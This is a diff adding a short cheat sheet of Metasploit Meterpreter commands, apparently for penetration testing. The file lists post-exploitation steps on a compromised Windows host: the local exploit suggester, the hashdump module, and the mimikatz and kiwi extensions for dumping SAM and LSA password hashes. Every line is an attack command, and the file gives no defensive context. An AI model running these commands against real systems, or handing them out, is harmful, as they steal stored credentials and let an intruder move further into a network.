@@ -1,0 +1,13 @@
+# Exploit suggester
+run post/multi/recon/local_exploit_suggester
+
+# LSA dump
+run post/windows/gather/hashdump
+
+# LSA dump (module mimikatz)
+load mimikatz
+mimikatz_command -f samdump::hashes
+
+# LSA dump 3 (module kiwi)
+load kiwi
+lsa_dump_sam
